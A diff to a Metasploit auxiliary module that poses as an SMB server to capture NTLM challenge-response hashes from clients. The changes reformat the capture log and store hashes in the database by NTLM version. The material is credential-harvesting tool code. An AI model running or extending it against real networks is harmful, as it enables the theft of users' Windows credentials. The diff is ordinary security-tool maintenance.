@@ -429,12 +429,6 @@ class Metasploit3 < Msf::Auxiliary
 			smb[:domain] = nil
 		end
 
-		if smb[:domain]
-			smb[:fullname] = "#{smb[:domain]}/#{smb[:username]}"
-		else
-			smb[:fullname] = smb[:username].to_s
-		end
-
 		unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then
 
 			@previous_lm_hash = lm_hash
@@ -496,28 +490,33 @@ class Metasploit3 < Msf::Auxiliary
 			# Display messages
 			if esn
 				smb[:username] = Rex::Text::to_ascii(smb[:username])
-				smb[:domain]   = Rex::Text::to_ascii(smb[:domain])
-				smb[:fullname] = Rex::Text::to_ascii(smb[:fullname])
+				smb[:domain]   = Rex::Text::to_ascii(smb[:domain]) if smb[:domain]
 			end
+
 			capturedtime = Time.now.to_s
 			case ntlm_ver
 			when NTLM_CONST::NTLM_V1_RESPONSE
+				smb_db_type_hash = "smb_netv1_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv1 Response Captured from #{smb[:name]} \n" +
-					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
 					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
 			when NTLM_CONST::NTLM_V2_RESPONSE
+				smb_db_type_hash = "smb_netv2_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLMv2 Response Captured from #{smb[:name]} \n" +
-					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
 					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
 					"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
 					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
 					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
 			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				#we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+				#also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
+				smb_db_type_hash = "smb_netv1_hash"
 				capturelogmessage =
 					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{smb[:name]} \n" +
-					"#{smb[:domain]}\\#{smb[:username]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
+					"USER:#{smb[:username]} DOMAIN:#{smb[:domain]} OS:#{smb[:peer_os]} LM:#{smb[:peer_lm]}\n" +
 					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
 					"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"
 
@@ -532,11 +531,12 @@ class Metasploit3 < Msf::Auxiliary
 				:host  => smb[:ip],
 				:port => datastore['SRVPORT'],
 				:sname => 'smb_challenge',
-				:user => smb[:fullname],
-				:pass => ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "<NULL>" ) + ":" +
-					( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s : "<NULL>" ) + ":" +
+				:user => smb[:username],
+				:pass => smb[:domain] + ":" +
+					( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
+					( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
 					datastore['CHALLENGE'].to_s,
-				:type => "smb_net_hash",
+				:type => smb_db_type_hash,
 				:proof => "NAME=#{smb[:nbsrc]} DOMAIN=#{smb[:domain]} OS=#{smb[:peer_os]}",
 				:active => true
 			)
